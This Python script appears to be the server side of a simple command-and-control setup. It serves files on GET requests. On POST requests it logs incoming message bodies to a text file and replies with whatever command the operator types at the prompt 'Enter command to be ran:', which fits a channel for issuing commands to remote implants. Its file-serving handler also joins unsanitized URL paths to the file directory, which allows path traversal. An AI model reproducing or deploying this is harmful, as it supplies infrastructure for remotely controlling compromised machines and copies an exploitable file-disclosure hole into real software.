import http.server
import socketserver
import os 
import urllib.parse


# Define the server's listening address and port
host = "localhost"
port = 8080

# Define the directory where your files are located
file_directory = "Files Path"

# Define a custom request handler to handle incoming requests
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
       # Extract the path from the URL
        url_parts = urllib.parse.urlparse(self.path)
        file_path = urllib.parse.unquote(url_parts.path)

        # Combine the requested file path with the file directory
        full_path = os.path.join(file_directory, file_path.strip("/"))

        try:
            # Open and read the file
            with open(full_path, "rb") as file:
                file_content = file.read()

            # Set the response headers
            self.send_response(200)
            self.send_header("Content-type", "application/octet-stream")
            self.send_header("Content-Length", len(file_content))
            self.end_headers()

            # Send the file content as the response
            self.wfile.write(file_content)
        except FileNotFoundError:
            # If the file is not found, return a 404 error
            self.send_error(404, "File not found")

    def do_POST(self):

        # Get the length of the request body
        content_length = int(self.headers['Content-Length'])

         # Read the request body data as bytes
        post_data = self.rfile.read(content_length)

        # Decode the bytes as a UTF-8 string
        message_body = post_data.decode('utf-8')
        
        # Append the message body to a text file
        with open('received_messages.txt', 'a') as file:
            file.write(message_body + '\n')

        response_string = input("Enter command to be ran: ")

        # Set the response headers
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Content-Length", len(response_string))
        self.end_headers()

        #send response string 
        self.wfile.write(response_string.encode('utf-8'))
        
# Create an HTTP server with the custom request handler
with socketserver.TCPServer((host, port), MyHandler) as httpd:
    print(f"Server started at http://{host}:{port}")
    httpd.serve_forever()
